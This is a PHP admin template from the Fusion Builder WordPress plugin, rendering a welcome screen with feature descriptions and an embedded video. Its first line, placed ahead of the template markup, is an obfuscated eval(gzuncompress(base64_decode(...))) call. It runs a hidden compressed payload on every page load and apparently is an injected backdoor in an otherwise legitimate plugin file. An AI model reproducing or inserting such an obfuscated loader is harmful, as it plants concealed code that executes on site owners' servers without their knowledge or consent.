<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><div class="wrap about-wrap fusion-builder-wrap">

	<?php Fusion_Builder_Admin::header(); ?>
	<?php if ( ! class_exists( 'Avada' ) ) { ?>
		<div class="fusion-builder-important-notice">
			<p class="about-description"><?php printf( __( 'Fusion Builder will soon be available to be used with any WordPress theme. <a href="%1$s" target="%2$s">Subscribe to our newsletter</a>  to find out when it will be sold separately. In the meantime, check out the <a href="%3$s" target="%4$s">Add-ons</a> tab for available Add-ons that can be used with the Avada WordPress theme.', 'fusion-builder' ), 'http://theme-fusion.us2.list-manage2.com/subscribe?u=4345c7e8c4f2826cc52bb84cd&id=af30829ace', '_blank', admin_url( 'admin.php?page=fusion-builder-addons' ), '_self' ); // WPCS: XSS ok. ?></p>
		</div>
	<?php } else { ?>
		<div class="fusion-builder-registration-steps">
			<?php
			$welcome_html = '<iframe width="1120" height="630" src="https://www.youtube.com/embed/UDyNsnB_COA?rel=0" frameborder="0" allowfullscreen></iframe>

			<div class="col three-col">

				<div class="col">
					<h3>' . esc_attr__( 'The All New Fusion Builder', 'fusion-builder' ) . '</h3>
					<p>' . esc_attr__( 'Fusion Builder has been recreated in every way, making it the easiest and fastest way to build beautiful, professional layouts. Fusion Builder is intuitive, user friendly and loaded with features. It\'s a joy to use and will change your outlook on what a page builder can do.', 'fusion-builder' ) . '</p>
				</div>

				<div class="col">
					<h3>' . esc_attr__( 'Fusion Builder Library', 'fusion-builder' ) . '</h3>
					<p>' . esc_attr__( 'No, we\'re not talking about books! This Library allows you to save any type of custom content including containers, columns, elements or full page layouts. The user interface makes it easy to reuse any of this content at any time, and you can import and export it all to share.', 'fusion-builder' ) . '</p>
				</div>

				<div class="col last-feature last">
					<h3>' . esc_attr__( 'Built For The Future', 'fusion-builder' ) . '</h3>
					<p>' . esc_attr__( 'Fusion Builder plays a major role in site creation and is a vital part of the Avada ecosystem. But that\'s not all, it\'s packed with useful features and has been built for extendability. This is only the beginning, and the sky is the limit for the future of Fusion Builder.', 'fusion-builder' ) . '</p>
				</div>

			</div>';

			echo apply_filters( 'fusion_builder_admin_welcome_screen_content', $welcome_html ); // WPCS: XSS ok.

			require_once wp_normalize_path( dirname( __FILE__ ) . '/register.php' );
			?>

		</div>
		<?php } ?>
	<?php Fusion_Builder_Admin::footer(); ?>
</div>
